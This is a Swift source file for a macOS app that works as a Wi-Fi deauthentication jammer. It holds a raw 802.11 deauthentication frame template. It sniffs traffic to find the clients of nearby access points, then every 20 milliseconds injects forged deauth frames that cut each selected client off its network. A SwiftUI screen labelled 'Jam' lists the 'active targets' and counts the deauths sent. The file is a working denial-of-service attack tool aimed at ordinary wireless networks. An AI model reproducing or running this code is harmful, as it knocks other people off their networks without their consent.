import Foundation
import AppKit
import SwiftUI
import Combine

let DEAUTH_REQ: [UInt8] = [
	0xC0,0x00,                        /* Type: Management Subtype: Deauthentication  */
	0x3C,0x00,                        /* Duration */
	0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,    /* Destination MAC Address */
	0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,    /* Transmitter MAC Address */
	0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,    /* BSSID */
	0x00,0x00,                        /* Sequence Number */
	0x01,0x00]                        /* Unspecified reason */

final class JWClientKiller: NSObject, ObservableObject, ANWiFiSnifferDelegate {
    weak var navigation: AppNavigation?
    @Published var clients: [JWClient] = []
    @Published var discoverNewClients = true
    @Published var headerStatsText = "Jam session primed"

    var channels: [CWChannel] = []
    var networksForChannel: [CWChannel: [JWScanResult]] = [:]
    var channelIndex = 0
    var sniffer: ANWiFiSniffer?
    var jamTimer: Timer?

    private var sortAscending = true
    private var sortOrder = ""

    init(navigation: AppNavigation?, sniffer theSniffer: ANWiFiSniffer?, networks: [JWScanResult]?, clients theClients: [JWClient]?) {
        self.navigation = navigation
        clients = theClients ?? []
        sniffer = theSniffer
        super.init()
        sniffer?.delegate = self
        sniffer?.start()

        var discoveredChannels: [CWChannel] = []
        for net in networks ?? [] {
            if let ch = net.wlanChannel,
               !discoveredChannels.contains(where: { $0.channelNumber == ch.channelNumber && $0.channelBand == ch.channelBand }) {
                discoveredChannels.append(ch)
            }
        }
        channels = discoveredChannels
        channelIndex = -1
        var grouped: [CWChannel: [JWScanResult]] = [:]
        for channel in channels {
            grouped[channel] = (networks ?? []).filter {
                $0.channelNumber == channel.channelNumber && $0.channelBandRaw == channel.channelBand.rawValue
            }
        }
        networksForChannel = grouped
        updateHeaderStats()
        if theSniffer != nil {
            jamTimer = Timer.scheduledTimer(timeInterval: 0.02, target: self, selector: #selector(performNextRound), userInfo: nil, repeats: true)
            performNextRound()
        }
    }

    func backButton(_ sender: Any?) {
        jamTimer?.invalidate()
        jamTimer = nil
        sniffer?.delegate = nil
        navigation?.pop()
    }

    func doneButton(_ sender: Any?) {
        jamTimer?.invalidate()
        jamTimer = nil
        sniffer?.stop()
        sniffer?.delegate = nil
        sniffer = nil
        navigation?.popToRoot()
    }

    func toggleClient(_ client: JWClient, enabled: Bool) {
        client.enabled = enabled
        updateHeaderStats()
        objectWillChange.send()
    }

    func sortClients(by key: String) {
        if sortOrder == key {
            sortAscending.toggle()
        } else {
            sortOrder = key
            sortAscending = true
        }

        let order: ComparisonResult = sortAscending ? .orderedAscending : .orderedDescending
        switch key {
        case "enabled": clients.sort { $0.enabled.description.localizedStandardCompare($1.enabled.description) == order }
        case "device": clients.sort { MACToString($0.macAddress).localizedStandardCompare(MACToString($1.macAddress)) == order }
        case "count": clients.sort { String($0.deauthsSent).localizedStandardCompare(String($1.deauthsSent)) == order }
        default: break
        }
    }

    @objc func performNextRound() {
        guard !channels.isEmpty else {
            updateHeaderStats()
            return
        }

        channelIndex += 1
        if channelIndex >= channels.count {
            channelIndex = 0
        }

        let channel = channels[channelIndex]
        sniffer?.setChannel(channel)
        let currentNetworks = networksForChannel[channel] ?? []

        for client in clients where client.enabled {
            for network in currentNetworks {
                var bssid = [UInt8](repeating: 0, count: 6)
                bssid.withUnsafeMutableBufferPointer { buf in
                    guard let base = buf.baseAddress, copyMAC(network.bssid, base), let packet = deauthPacket(forBSSID: base, client: client.macAddress) else { return }
                    sniffer?.write(packet)
                    client.deauthsSent += 1
                }
            }
        }

        updateHeaderStats()
        objectWillChange.send()
    }

    func deauthPacket(forBSSID bssid: UnsafePointer<UInt8>?, client: UnsafePointer<UInt8>?) -> AN80211Packet? {
        var deauth = [CChar](repeating: 0, count: 26)
        memcpy(&deauth[0], DEAUTH_REQ, 26)
        memcpy(&deauth[4], client, 6)
        memcpy(&deauth[10], bssid, 6)
        memcpy(&deauth[16], bssid, 6)
        return AN80211Packet(data: Data(bytes: deauth, count: 26))
    }

    func includesBSSID(_ bssid: UnsafePointer<UInt8>?) -> Bool {
        networksForChannel.values.flatMap { $0 }.containsBSSID(bssid)
    }

    func wifiSniffer(_ sniffer: ANWiFiSniffer?, gotPacket packet: AN80211Packet?) {
        guard discoverNewClients else { return }
        var hasClient = false
        var client = [CUnsignedChar](repeating: 0, count: 6)
        var bssid = [CUnsignedChar](repeating: 0, count: 6)
        if packet?.dataFCS() != packet?.calculateFCS() { return }

        if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 1 {
            bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) { Array($0.bindMemory(to: CUnsignedChar.self)) }
            if !includesBSSID(bssid) { return }
            client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { Array($0.bindMemory(to: CUnsignedChar.self)) }
            hasClient = true
        } else if packet?.macHeader().pointee.frame_control.from_ds == 0 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
            bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac3) { Array($0.bindMemory(to: CUnsignedChar.self)) }
            if !includesBSSID(bssid) { return }
            if memcmp(withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { $0.baseAddress! }, withUnsafeBytes(of: packet?.macHeader().pointee.mac3) { $0.baseAddress! }, 6) != 0 {
                client = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { Array($0.bindMemory(to: CUnsignedChar.self)) }
                hasClient = true
            }
        } else if packet?.macHeader().pointee.frame_control.from_ds == 1 && packet?.macHeader().pointee.frame_control.to_ds == 0 {
            bssid = withUnsafeBytes(of: packet?.macHeader().pointee.mac2) { Array($0.bindMemory(to: CUnsignedChar.self)) }
            if !includesBSSID(bssid) { return }
            client = withUnsafeBytes(of: packet?.macHeader().pointee.mac1) { Array($0.bindMemory(to: CUnsignedChar.self)) }
            hasClient = true
        }

        if client[0] == 0x33 && client[1] == 0x33 { hasClient = false }
        if client[0] == 0x01 && client[1] == 0x00 { hasClient = false }
        if client[0] == 0xff && client[1] == 0xff { hasClient = false }
        if client[0] == 0x03 && client[5] == 0x01 { hasClient = false }

        if hasClient {
            DispatchQueue.main.async {
                let clientObject = JWClient(mac: client, bssid: bssid)
                let containsClient = self.clients.contains { $0.macAddress.prefix(6).elementsEqual(clientObject.macAddress.prefix(6)) }
                if !containsClient {
                    self.clients.append(clientObject)
                    self.updateHeaderStats()
                }
            }
        }
    }

    func wifiSniffer(_ sniffer: ANWiFiSniffer?, failedWithError error: Error?) {
        if let error = error {
            print("Got error: \(error)")
        }
    }

    func wifiSnifferFailed(toOpenInterface sniffer: ANWiFiSniffer?) {
        print("Couldn't open interface")
    }

    private func updateHeaderStats() {
        let enabledCount = clients.filter(\.enabled).count
        headerStatsText = "\(enabledCount) active targets • \(clients.count) total clients"
    }
}

struct JWClientKillerScreen: View {
    @ObservedObject var controller: JWClientKiller

    var body: some View {
        VStack(alignment: .leading, spacing: 16) {
            HStack {
                Text("Jam")
                    .font(.title2.weight(.semibold))
                Spacer()
                Text(controller.headerStatsText)
                    .font(.caption)
                    .foregroundStyle(.secondary)
            }

            VStack(spacing: 0) {
                headerRow
                Divider()
                List {
                    ForEach(controller.clients, id: \.self) { client in
                        HStack(spacing: 12) {
                            Toggle("", isOn: Binding(
                                get: { client.enabled },
                                set: { controller.toggleClient(client, enabled: $0) }
                            ))
                            .labelsHidden()
                            .frame(width: 30, alignment: .leading)
                            Text(MACToString(client.macAddress))
                                .font(.system(.body, design: .monospaced))
                                .frame(width: 180, alignment: .leading)
                            Text("\(client.deauthsSent)")
                                .frame(width: 100, alignment: .trailing)
                        }
                        .font(.system(size: 13))
                    }
                }
                .listStyle(.plain)
            }

            HStack {
                Toggle("Actively scan for clients", isOn: $controller.discoverNewClients)
                Spacer()
                Button("Back") { controller.backButton(nil) }
                Button("Done") { controller.doneButton(nil) }
            }
        }
        .padding(20)
        .frame(maxWidth: .infinity, maxHeight: .infinity, alignment: .topLeading)
    }

    private var headerRow: some View {
        HStack(spacing: 12) {
            headerButton("Jam", key: "enabled")
                .frame(width: 30, alignment: .leading)
            headerButton("Device", key: "device")
                .frame(width: 180, alignment: .leading)
            headerButton("Deauths", key: "count")
                .frame(width: 100, alignment: .trailing)
        }
        .font(.caption.weight(.semibold))
        .foregroundStyle(.secondary)
    }

    private func headerButton(_ title: String, key: String) -> some View {
        Button(title) {
            controller.sortClients(by: key)
        }
        .buttonStyle(.plain)
    }
}

#if canImport(SwiftUI)
private struct JWClientKillerPreviewWrapper: View {
    @StateObject private var controller = JWClientKiller(navigation: nil, sniffer: nil, networks: JWPreviewFactory.sampleNetworks, clients: JWPreviewFactory.sampleClients)
    var body: some View { JWClientKillerScreen(controller: controller) }
}
struct JWClientKiller_Previews: PreviewProvider {
    static var previews: some View {
        JWClientKillerPreviewWrapper()
            .frame(width: 1100, height: 720)
    }
}
#endif
